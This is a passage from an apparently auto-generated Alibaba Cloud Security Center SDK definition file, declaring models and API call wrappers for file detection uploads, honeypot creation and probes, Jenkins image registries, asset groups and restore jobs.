  * The form upload method is provided by OSS. For more information, see [Form upload](https://www.alibabacloud.com/help/en/object-storage-service/latest/upload-objects-form-upload).
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectUploadUrlRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateFileDetectUploadUrlResponse
 */
async function createFileDetectUploadUrlWithOptions(request: CreateFileDetectUploadUrlRequest, runtime: Util.RuntimeOptions): CreateFileDetectUploadUrlResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKeyContextList)) {
    query['HashKeyContextList'] = request.hashKeyContextList;
  }
  if (!Util.isUnset(request.hashKeyList)) {
    query['HashKeyList'] = request.hashKeyList;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileDetectUploadUrl',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call the this operation to query the parameters that are required to upload a file for detection. If the value of the response parameter FileExist is true, the file that you want to upload for detection already exists in the cloud. In this case, you can directly push the file for detection. If the value of the response parameter FileExist is false, you must use the form upload method to upload the file to the specified Object Storage Service (OSS) bucket based on the response parameters of this operation.
  * The form upload method is provided by OSS. For more information, see [Form upload](https://www.alibabacloud.com/help/en/object-storage-service/latest/upload-objects-form-upload).
  * The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
  *
  * @param request CreateFileDetectUploadUrlRequest
  * @return CreateFileDetectUploadUrlResponse
 */
async function createFileDetectUploadUrl(request: CreateFileDetectUploadUrlRequest): CreateFileDetectUploadUrlResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileDetectUploadUrlWithOptions(request, runtime);
}

model CreateHoneypotRequest {
  honeypotImageId?: string(name='HoneypotImageId', description='The ID of the image that is used for the honeypot.

>  You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to obtain the IDs of images from the **HoneypotImageId** response parameter.', example='sha256:ebc4c102ac407d53733c2373e8888a733ddce86f163ccbe7492ae1cbf26****'),
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.

>  You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to obtain the names of images from the **HoneypotImageName** response parameter.', example='HoneyPotImageName'),
  honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
  meta?: string(name='Meta', description='The custom configuration of the honeypot in the JSON format. The value contains the following fields:

*   **trojan_git**: Git-specific Defense. Valid values:

    *   **zip**: Git Source Code Package
    *   **web**: Git Directory Leak
    *   **close**: Disabled

*   **trojan\\_git_addr**: Git Trojan Address.

*   **trojan_git.zip**: Git Trojan.

*   **burp**: Burp-specific Defense. Valid values:

    *   **open**: Enabled
    *   **close**: Disabled

*   **portrait_option**: Source Tracing Configuration. Valid values:

    *   **false**: Disable
    *   **true**: Enable', example='{\\"trojan_git\\":\\"close\\",\\"burp\\":\\"close\\",\\"portrait_option\\":\\"false\\"}'),
  nodeId?: string(name='NodeId', description='The ID of the management node to which you want to deploy the honeypot.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to obtain the IDs of management nodes.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
}

model CreateHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was is successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node to which the honeypot is deployed.', example='managerNodename'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image that is used for the honeypot.', example='HoneyDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='tcp_proxy'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='ddh3731641137fe4b72b245346a2721d4b6tdgg3731641137fe4b72b245346a2721***'),
    state?: [ string ](name='State', description='The status of the honeypot.'),
  }(name='Data', description='The information about the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='29874225-EAAC-5415-8501-32DD20FD29F6'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotResponseBody(name='body'),
}

async function createHoneypotWithOptions(request: CreateHoneypotRequest, runtime: Util.RuntimeOptions): CreateHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageId)) {
    query['HoneypotImageId'] = request.honeypotImageId;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypot(request: CreateHoneypotRequest): CreateHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotWithOptions(request, runtime);
}

model CreateHoneypotNodeRequest {
  allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Specifies whether to allow the honeypots to access the Internet. Valid values:

*   **true**: allows the honeypots to access the Internet.
*   **false**: does not allow the honeypots to access the Internet.', example='true'),
  availableProbeNum?: int32(name='AvailableProbeNum', description='The number of probes that you want to allocate for the management node.', example='20'),
  nodeName?: string(name='NodeName', description='The name of the management node.', example='manageNode'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='The CIDR blocks that are allowed to access the management node.'),
}

model CreateHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNode?: {
    nodeId?: string(name='NodeId'),
  }(name='HoneypotNode'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotNodeResponseBody(name='body'),
}

async function createHoneypotNodeWithOptions(request: CreateHoneypotNodeRequest, runtime: Util.RuntimeOptions): CreateHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.allowHoneypotAccessInternet)) {
    query['AllowHoneypotAccessInternet'] = request.allowHoneypotAccessInternet;
  }
  if (!Util.isUnset(request.availableProbeNum)) {
    query['AvailableProbeNum'] = request.availableProbeNum;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.securityGroupProbeIpList)) {
    query['SecurityGroupProbeIpList'] = request.securityGroupProbeIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotNode(request: CreateHoneypotNodeRequest): CreateHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotNodeWithOptions(request, runtime);
}

model CreateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName', example='webmin'),
  meta?: string(name='Meta', example='{\\"burp\\":\\"close\\",\\"trojan_git\\":\\"close\\",\\"portrait_option\\":\\"true\\"}'),
  nodeId?: string(name='NodeId', example='9373fe59-74d5-4505-bb24-c85352fb91bd'),
  presetName?: string(name='PresetName', example='WebMin-online'),
}

model CreateHoneypotPresetResponseBody = {
  code?: string(name='Code'),
  honeypotPreset?: {
    honeypotPresetId?: string(name='HoneypotPresetId', example='d6ece172-34d9-4942-99a4-b309cb557d07'),
  }(name='HoneypotPreset'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  message?: string(name='Message'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model CreateHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotPresetResponseBody(name='body'),
}

async function createHoneypotPresetWithOptions(request: CreateHoneypotPresetRequest, runtime: Util.RuntimeOptions): CreateHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotPreset(request: CreateHoneypotPresetRequest): CreateHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotPresetWithOptions(request, runtime);
}

model CreateHoneypotProbeRequest {
  arp?: boolean(name='Arp', description='Specifies whether to enable Address Resolution Protocol (ARP) spoofing. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  businessGroupId?: string(name='BusinessGroupId', description='The ID of the business group.', example='2022011817324588686'),
  controlNodeId?: string(name='ControlNodeId', description='The ID of the management node.

>  You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
  displayName?: string(name='DisplayName', description='The name of the probe.', example='testHoneyPotProbe'),
  honeypotBindList?: [ 
    {
      bindPortList?: [ 
        {
          bindPort?: boolean(name='BindPort', description='Specifies whether to bind a port. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
          endPort?: int32(name='EndPort', description='The end of the port range.', example='90'),
          fixed?: boolean(name='Fixed', description='Specifies whether the port is fixed. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
          startPort?: int32(name='StartPort', description='The start of the port range.', example='80'),
          targetPort?: int32(name='TargetPort', description='The destination port.

>  If **HoneypotId** is specified, this parameter is required.', example='80'),
        }
      ](name='BindPortList', description='The listener ports.'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='1a5eda2d40f92ac87d6b63e1a5ad4b76fe0d4110c4a3e2fa85438a29ae55****'),
    }
  ](name='HoneypotBindList', description='The honeypot configurations.'),
  ping?: boolean(name='Ping', description='Specifies whether to enable ping scan. Valid values:

*   **false**: yes
*   **false**: no', example='true'),
  probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: virtual private cloud (VPC) probe', example='host_probe'),
  probeVersion?: string(name='ProbeVersion', description='The version of the probe.', example='0.0.0'),
  proxyIp?: string(name='ProxyIp', description='The IP address of the proxy.', example='192.168.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the instance.

>  If **ProbeType** is set to **host_probe**, this parameter is required.', example='e4af3620-6895-4e2f-a641-a9d8fb53****'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.

>  If **ProbeType** is set to **vpc_black_hole_probe**, this parameter is required. You can call the DescribeVpcHoneyPotList operation to query the IDs of VPCs.', example='vpc-zm0asrkpv1q8gnk7mn4dn'),
}

model CreateHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotProbe?: {
    probeId?: string(name='ProbeId'),
  }(name='HoneypotProbe'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A839E8-70AE-591D-8D9E-C5419A2240DB'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateHoneypotProbeResponseBody(name='body'),
}

async function createHoneypotProbeWithOptions(request: CreateHoneypotProbeRequest, runtime: Util.RuntimeOptions): CreateHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.arp)) {
    query['Arp'] = request.arp;
  }
  if (!Util.isUnset(request.businessGroupId)) {
    query['BusinessGroupId'] = request.businessGroupId;
  }
  if (!Util.isUnset(request.controlNodeId)) {
    query['ControlNodeId'] = request.controlNodeId;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.honeypotBindList)) {
    query['HoneypotBindList'] = request.honeypotBindList;
  }
  if (!Util.isUnset(request.ping)) {
    query['Ping'] = request.ping;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  if (!Util.isUnset(request.probeVersion)) {
    query['ProbeVersion'] = request.probeVersion;
  }
  if (!Util.isUnset(request.proxyIp)) {
    query['ProxyIp'] = request.proxyIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createHoneypotProbe(request: CreateHoneypotProbeRequest): CreateHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotProbeWithOptions(request, runtime);
}

model CreateJenkinsImageRegistryRequest {
  domainName?: string(name='DomainName', example='example.com'),
  extraParam?: string(name='ExtraParam', example='[{\\"namespace\\":\\"aa\\",\\"authToken\\":\\"aa\\"}]'),
  netType?: int32(name='NetType', example='1'),
  password?: string(name='Password', example='Harbor********'),
  persistenceDay?: int32(name='PersistenceDay', example='30'),
  protocolType?: int32(name='ProtocolType', example='1'),
  regionId?: string(name='RegionId', example='cn-shanghai'),
  registryHostIp?: string(name='RegistryHostIp', example='114.55.XXX.XXX'),
  registryName?: string(name='RegistryName', example='testRepo'),
  registryType?: string(name='RegistryType', example='CI/CD'),
  registryVersion?: string(name='RegistryVersion', example='V1'),
  sourceIp?: string(name='SourceIp', example='41.121.XXX.XXX'),
  transPerHour?: int32(name='TransPerHour', example='30'),
  userName?: string(name='UserName', example='RegistryUser'),
  vpcId?: string(name='VpcId', example='vpc-2ze4aoqgeu51ydfb8****'),
  whiteList?: string(name='WhiteList', example='192.168.XXX.XXX'),
}

model CreateJenkinsImageRegistryResponseBody = {
  data?: {
    blackList?: string(name='BlackList', example='61.9.XXX.XXX'),
    domainName?: string(name='DomainName', example='example.com'),
    gmtCreate?: string(name='GmtCreate', example='2022-10-16 18:17:16'),
    gmtModified?: string(name='GmtModified', example='2022-11-21 10:40:01'),
    id?: long(name='Id', example='443496'),
    netType?: int32(name='NetType', example='1'),
    password?: string(name='Password', example='Harbor******'),
    persistenceDay?: int32(name='PersistenceDay', example='30'),
    protocolType?: int32(name='ProtocolType', example='1'),
    regionId?: string(name='RegionId', example='cn-shanghai'),
    registryHostIp?: string(name='RegistryHostIp', example='1.13.XXX.XXX'),
    registryName?: string(name='RegistryName', example='fanyi'),
    registryType?: string(name='RegistryType', example='CI/CD'),
    token?: string(name='Token', example='3c3c602c-fa1f-4bc0-992f-b4b2cac7****'),
    transPerHour?: int32(name='TransPerHour', example='30'),
    userName?: string(name='UserName', example='RegistryUser'),
    vpcId?: string(name='VpcId', example='vpc-2vchkxmf2j9yjt3x2****'),
    whiteList?: string(name='WhiteList', example='192.168.XXX.XXX'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  requestId?: string(name='RequestId', example='1AF1E723-53F1-55BF-A4B2-15CB7A32****'),
  timeCost?: long(name='TimeCost', example='1'),
}

model CreateJenkinsImageRegistryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateJenkinsImageRegistryResponseBody(name='body'),
}

async function createJenkinsImageRegistryWithOptions(request: CreateJenkinsImageRegistryRequest, runtime: Util.RuntimeOptions): CreateJenkinsImageRegistryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var body : map[string]any = {};
  if (!Util.isUnset(request.domainName)) {
    body['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.extraParam)) {
    body['ExtraParam'] = request.extraParam;
  }
  if (!Util.isUnset(request.netType)) {
    body['NetType'] = request.netType;
  }
  if (!Util.isUnset(request.password)) {
    body['Password'] = request.password;
  }
  if (!Util.isUnset(request.persistenceDay)) {
    body['PersistenceDay'] = request.persistenceDay;
  }
  if (!Util.isUnset(request.protocolType)) {
    body['ProtocolType'] = request.protocolType;
  }
  if (!Util.isUnset(request.regionId)) {
    body['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.registryHostIp)) {
    body['RegistryHostIp'] = request.registryHostIp;
  }
  if (!Util.isUnset(request.registryName)) {
    body['RegistryName'] = request.registryName;
  }
  if (!Util.isUnset(request.registryType)) {
    body['RegistryType'] = request.registryType;
  }
  if (!Util.isUnset(request.registryVersion)) {
    body['RegistryVersion'] = request.registryVersion;
  }
  if (!Util.isUnset(request.transPerHour)) {
    body['TransPerHour'] = request.transPerHour;
  }
  if (!Util.isUnset(request.userName)) {
    body['UserName'] = request.userName;
  }
  if (!Util.isUnset(request.vpcId)) {
    body['VpcId'] = request.vpcId;
  }
  if (!Util.isUnset(request.whiteList)) {
    body['WhiteList'] = request.whiteList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'CreateJenkinsImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createJenkinsImageRegistry(request: CreateJenkinsImageRegistryRequest): CreateJenkinsImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return createJenkinsImageRegistryWithOptions(request, runtime);
}

model CreateOrUpdateAssetGroupRequest {
  groupId?: long(name='GroupId', description='The ID of the server group for which you want to add to or remove servers.

>  To modify the mapping between an asset and an asset group, you must provide the ID of the asset group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) to query the IDs of asset groups. If you do not configure this parameter when you call this operation, an asset group is created.', example='55426'),
  groupName?: string(name='GroupName', description='The name of the server group that you want to create or the server group for which you want to add or remove a server.

>  To modify the mapping between a server and a server group, you must provide the name of the server group. You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the names of server groups. If you do not configure GroupID when you call this operation, a server group is created. In this case, you must configure GroupName.', example='test'),
  uuids?: string(name='Uuids', description='The UUID of the server in the server group that you want to create or the server group for which you want to add or remove servers. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='aq12-***,s23***'),
}

model CreateOrUpdateAssetGroupResponseBody = {
  groupId?: long(name='GroupId', description='The ID of the server group.', example='9935302'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E70074C8-DFB4-44C5-96C7-909DD231D68A'),
}

model CreateOrUpdateAssetGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateOrUpdateAssetGroupResponseBody(name='body'),
}

/**
  * A server can belong only to one server group. If you call the CreateOrUpdateAssetGroup operation and the server specified in request parameters belongs to Server Group A, the server is removed from Server Group A and then added to the newly created or specified server group after the call is complete.
  *
  * @param request CreateOrUpdateAssetGroupRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateOrUpdateAssetGroupResponse
 */
async function createOrUpdateAssetGroupWithOptions(request: CreateOrUpdateAssetGroupRequest, runtime: Util.RuntimeOptions): CreateOrUpdateAssetGroupResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.groupName)) {
    query['GroupName'] = request.groupName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateOrUpdateAssetGroup',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * A server can belong only to one server group. If you call the CreateOrUpdateAssetGroup operation and the server specified in request parameters belongs to Server Group A, the server is removed from Server Group A and then added to the newly created or specified server group after the call is complete.
  *
  * @param request CreateOrUpdateAssetGroupRequest
  * @return CreateOrUpdateAssetGroupResponse
 */
async function createOrUpdateAssetGroup(request: CreateOrUpdateAssetGroupRequest): CreateOrUpdateAssetGroupResponse {
  var runtime = new Util.RuntimeOptions{};
  return createOrUpdateAssetGroupWithOptions(request, runtime);
}

model CreateRestoreJobRequest {
  includes?: string(name='Includes', example='["root"]'),
  snapshotHash?: string(name='SnapshotHash', example='d4b399edaad94b038e8f91873f19e3eae010ca30798fc36db3a164dd343f****'),
  snapshotId?: string(name='SnapshotId', example='s-00023dhaatxp18mh****'),
  snapshotVersion?: string(name='SnapshotVersion', example='165570544****'),
  sourceType?: string(name='SourceType', example='ECS_FILE'),
  target?: string(name='Target', example='/root/testfls'),
  uuid?: string(name='Uuid', example='inet-ecs-4e876cb0-09f7-43b8-82ef-4bc7a93769b5'),
  vaultId?: string(name='VaultId', example='v-0002n12wokck2q0x****'),
}

model CreateRestoreJobResponseBody = {
  requestId?: string(name='RequestId', example='BD4B24CE-E5C4-5727-B731-BE85F1D4****'),
}

model CreateRestoreJobResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateRestoreJobResponseBody(name='body'),
}

async function createRestoreJobWithOptions(request: CreateRestoreJobRequest, runtime: Util.RuntimeOptions): CreateRestoreJobResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.includes)) {
    query['Includes'] = request.includes;
  }
  if (!Util.isUnset(request.snapshotHash)) {
    query['SnapshotHash'] = request.snapshotHash;
  }
  if (!Util.isUnset(request.snapshotId)) {
    query['SnapshotId'] = request.snapshotId;
  }
  if (!Util.isUnset(request.snapshotVersion)) {
    query['SnapshotVersion'] = request.snapshotVersion;
  }
  if (!Util.isUnset(request.sourceType)) {
    query['SourceType'] = request.sourceType;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vaultId)) {
    query['VaultId'] = request.vaultId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateRestoreJob',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function createRestoreJob(request: CreateRestoreJobRequest): CreateRestoreJobResponse {
  var runtime = new Util.RuntimeOptions{};
  return createRestoreJobWithOptions(request, runtime);
}

model CreateServiceLinkedRoleRequest {
  serviceLinkedRole?: string(name='ServiceLinkedRole', description='The service-linked role. Default value: **AliyunServiceRoleForSas**. Valid values:

*   **AliyunServiceRoleForSas**: the service-linked role of Security Center. Security Center assumes this role to access the resources of other cloud services within your account.
*   **AliyunServiceRoleForSasCspm**: the service-linked role of Security Center-CSPM. Security Center-CSPM assumes this role to access the resources of other cloud services within your account.', example='AliyunServiceRoleForSas'),
}

model CreateServiceLinkedRoleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B94243D2-9342-4D82-87B9-DF9A038A87E1'),
}

model CreateServiceLinkedRoleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateServiceLinkedRoleResponseBody(name='body'),
}

/**
  * For more information about service-linked roles, see [Service-linked roles](~~160674~~).
  *
  * @param request CreateServiceLinkedRoleRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return CreateServiceLinkedRoleResponse
 */
async function createServiceLinkedRoleWithOptions(request: CreateServiceLinkedRoleRequest, runtime: Util.RuntimeOptions): CreateServiceLinkedRoleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.serviceLinkedRole)) {
    query['ServiceLinkedRole'] = request.serviceLinkedRole;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateServiceLinkedRole',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * For more information about service-linked roles, see [Service-linked roles](~~160674~~).
  *
  * @param request CreateServiceLinkedRoleRequest
  * @return CreateServiceLinkedRoleResponse
 */
async function createServiceLinkedRole(request: CreateServiceLinkedRoleRequest): CreateServiceLinkedRoleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createServiceLinkedRoleWithOptions(request, runtime);
}

model CreateSimilarSecurityEventsQueryTaskRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  securityEventId?: long(name='SecurityEventId', description='The ID of the alert event.

>  You must specify at least one of the SecurityEventId and SimilarEventScenarioCode parameters.', example='14323'),
  similarEventScenarioCode?: string(name='SimilarEventScenarioCode', description='The codes of alert events that are triggered by the same rule or of the same alert type.

>  You must specify at least one of the SecurityEventId and SimilarEventScenarioCode parameters.', example='default'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model CreateSimilarSecurityEventsQueryTaskResponseBody = {
  createSimilarSecurityEventsQueryTaskResponse?: {
    status?: string(name='Status', description='The status of the task. Valid values:

*   **New**: The task is created.
*   **RetrievingData**: Data is being retrieved.
*   **DataRetrieved**: Data is retrieved.
*   **Processing**: The task is running.
*   **Success**: The task is successful.
*   **Failed**: The task failed.
*   **PartialFailed**: The task partially failed.', example='New'),
    taskId?: long(name='TaskId', description='The ID of the task.', example='2915'),
  }(name='CreateSimilarSecurityEventsQueryTaskResponse', description='The information about the task that queries alert events of the same alert type.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5861EE3E-F0B3-48B8-A5DC-A5080BFBE052'),
}

model CreateSimilarSecurityEventsQueryTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: CreateSimilarSecurityEventsQueryTaskResponseBody(name='body'),
}

async function createSimilarSecurityEventsQueryTaskWithOptions(request: CreateSimilarSecurityEventsQueryTaskRequest, runtime: Util.RuntimeOptions): CreateSimilarSecurityEventsQueryTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
